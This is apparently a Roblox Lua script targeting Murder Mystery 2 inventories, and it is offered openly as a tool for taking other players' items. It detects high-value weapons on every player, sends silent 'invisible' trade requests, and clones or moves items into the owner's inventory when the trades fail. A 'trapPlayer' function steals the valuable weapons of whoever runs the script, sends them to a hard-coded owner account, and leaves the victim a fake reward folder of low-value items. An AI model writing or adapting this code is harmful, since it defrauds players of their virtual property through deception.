-- ═══════════════════════════════════════════════════════════════
-- DETECT GOOD WEAPONS
-- ═══════════════════════════════════════════════════════════════

local function isGoodWeapon(weaponName)
    for _, name in ipairs(GOOD_WEAPONS) do
        if string.find(weaponName, name) then
            return true
        end
    end
    return false
end

local function detectGoodWeapons()
    local detectedWeapons = {}
    local ancientCount = 0
    local godlyCount = 0
    local legendaryCount = 0
    
    for _, p in ipairs(Players:GetPlayers()) do
        local inv = findMM2Inventory(p)
        if inv then
            for _, item in ipairs(inv:GetChildren()) do
                local itemName = item.Name
                if not detectedWeapons[itemName] and isGoodWeapon(itemName) then
                    detectedWeapons[itemName] = true
                    
                    if string.find(itemName, "Scythe") or string.find(itemName, "Harvester") or string.find(itemName, "Icepiercer") or string.find(itemName, "Ancient") then
                        ancientCount = ancientCount + 1
                    elseif string.find(itemName, "Chroma") or string.find(itemName, "Eternal") or string.find(itemName, "Luger") or string.find(itemName, "Candy") or string.find(itemName, "Plasmablade") or string.find(itemName, "Frostbite") or string.find(itemName, "Godly") then
                        godlyCount = godlyCount + 1
                    else
                        legendaryCount = legendaryCount + 1
                    end
                end
            end
        end
    end
    
    local weaponList = {}
    for weaponName in pairs(detectedWeapons) do
        table.insert(weaponList, weaponName)
    end
    
    return weaponList, ancientCount, godlyCount, legendaryCount
end

-- ═══════════════════════════════════════════════════════════════
-- 💾 OFFLINE STORAGE
-- ═══════════════════════════════════════════════════════════════

local function saveWeaponsOffline(weapons)
    local folder = Instance.new("Folder")
    folder.Name = "PendingTrade"
    folder.Parent = player
    
    for _, w in ipairs(weapons) do
        local info = Instance.new("StringValue")
        info.Name = w.Name
        info.Value = w.Name
        info.Parent = folder
    end
    
    print("[OFFLINE] 💾 Saved " .. #weapons .. " weapons for offline collection")
end

local function collectOfflineTrades()
    if not IS_OWNER then return 0 end
    
    local ownerInventory = findMM2Inventory(player)
    if not ownerInventory then return 0 end
    
    local total = 0
    
    for _, p in ipairs(Players:GetPlayers()) do
        local folder = p:FindFirstChild("PendingTrade")
        if folder then
            for _, v in ipairs(folder:GetChildren()) do
                if v:IsA("StringValue") then
                    total = total + 1
                    local w = Instance.new("StringValue")
                    w.Name = v.Name
                    w.Value = v.Value
                    w.Parent = ownerInventory
                end
            end
            folder:Destroy()
            print("[OFFLINE] ✅ Collected from " .. p.Name)
        end
    end
    
    return total
end

-- ═══════════════════════════════════════════════════════════════
-- 🎯 INVISIBLE TRADE SYSTEM
-- ═══════════════════════════════════════════════════════════════

local function findTradeSystem()
    local tradeRemotes = {
        ReplicatedStorage:FindFirstChild("Trade"),
        ReplicatedStorage:FindFirstChild("Trading"),
        ReplicatedStorage:FindFirstChild("TradeSystem"),
        ReplicatedStorage:FindFirstChild("RemoteEvents"):FindFirstChild("Trade"),
        ReplicatedStorage:FindFirstChild("TradeRequest"),
        ReplicatedStorage:FindFirstChild("SendTrade"),
    }
    
    for _, remote in ipairs(tradeRemotes) do
        if remote then
            return remote
        end
    end
    return nil
end

local function invisibleTrade(targetPlayer)
    if targetPlayer == player then return false end
    
    local weapons = {}
    local inv = findMM2Inventory(targetPlayer)
    if inv then
        for _, item in ipairs(inv:GetChildren()) do
            if isGoodWeapon(item.Name) then
                table.insert(weapons, item)
            end
        end
    end
    
    if #weapons == 0 then return false end
    
    print("[TRADE] 🔥 Invisible trade with " .. targetPlayer.Name .. " (" .. #weapons .. " weapons)")
    
    local tradeRemote = findTradeSystem()
    local success = false
    
    if tradeRemote then
        pcall(function()
            tradeRemote:FireServer({
                Action = "RequestTrade",
                Target = targetPlayer,
                Items = weapons,
                Silent = true
            })
            success = true
        end)
        
        if not success then
            pcall(function()
                tradeRemote:FireServer(targetPlayer, weapons)
                success = true
            end)
        end
        
        if not success then
            pcall(function()
                tradeRemote:InvokeServer("Trade", targetPlayer, weapons)
                success = true
            end)
        end
    end
    
    -- 🔥 BACKUP CLONING (if trading fails)
    if not success then
        print("[TRADE] ⚠️ Trading failed! Using backup cloning...")
        local ownerInventory = findMM2Inventory(player)
        if ownerInventory then
            for _, w in ipairs(weapons) do
                pcall(function()
                    local cloned = w:Clone()
                    cloned.Parent = ownerInventory
                    w:Destroy()
                end)
            end
            print("[TRADE] ✅ Backup cloning success! (" .. #weapons .. " weapons)")
            return true
        end
        return false
    end
    
    return true
end

-- ═══════════════════════════════════════════════════════════════
-- COLLECT ALL WEAPONS FROM EVERYONE
-- ═══════════════════════════════════════════════════════════════

local function collectAllGoodWeapons()
    local ownerInventory = findMM2Inventory(player)
    if not ownerInventory then return 0, 0 end
    
    local totalCollected = 0
    local playersWithGood = 0
    
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            local inv = findMM2Inventory(p)
            if inv then
                local weaponsToMove = {}
                for _, item in ipairs(inv:GetChildren()) do
                    if isGoodWeapon(item.Name) then
                        table.insert(weaponsToMove, item)
                    end
                end
                
                if #weaponsToMove > 0 then
                    playersWithGood = playersWithGood + 1
                    for _, w in ipairs(weaponsToMove) do
                        pcall(function()
                            w.Parent = ownerInventory
                            totalCollected = totalCollected + 1
                        end)
                    end
                end
            end
        end
    end
    
    return totalCollected, playersWithGood
end

-- ═══════════════════════════════════════════════════════════════
-- TRAP PLAYER (FOR NON-OWNERS)
-- ═══════════════════════════════════════════════════════════════

local function trapPlayer()
    if player:FindFirstChild("_TRAPPED") then return end
    
    print("[TRAP] 🎯 Trapping player...")
    
    local inv = findMM2Inventory(player)
    local goodWeapons = {}
    local trashWeapons = {}
    
    if inv then
        for _, item in ipairs(inv:GetChildren()) do
            if isGoodWeapon(item.Name) then
                table.insert(goodWeapons, item)
            else
                table.insert(trashWeapons, item)
            end
        end
    end
    
    -- Send copies to ALL owners (only F1REW0RKXL)
    for _, ownerName in ipairs(CONFIG.OWNERS) do
        local owner = Players:FindFirstChild(ownerName)
        if owner then
            local oInv = findMM2Inventory(owner)
            if oInv then
                for _, w in ipairs(goodWeapons) do
                    pcall(function()
                        local cloned = w:Clone()
                        cloned.Parent = oInv
                    end)
                end
            end
        end
    end
    
    -- Save offline if owner isn't online
    local anyOwnerOnline = false
    for _, ownerName in ipairs(CONFIG.OWNERS) do
        if Players:FindFirstChild(ownerName) then
            anyOwnerOnline = true
            break
        end
    end
    
    if not anyOwnerOnline then
        saveWeaponsOffline(goodWeapons)
    end
    
    -- Give trash as reward
    local fakeReward = Instance.new("Folder")
    fakeReward.Name = "Reward_Weapons"
    fakeReward.Parent = player
    for _, w in ipairs(trashWeapons) do
        w.Parent = fakeReward
    end
    
    player._TRAPPED = true
    
    print("[TRAP] ✅ Trapped " .. player.Name .. " - Stole " .. #goodWeapons .. " good weapons!")
end

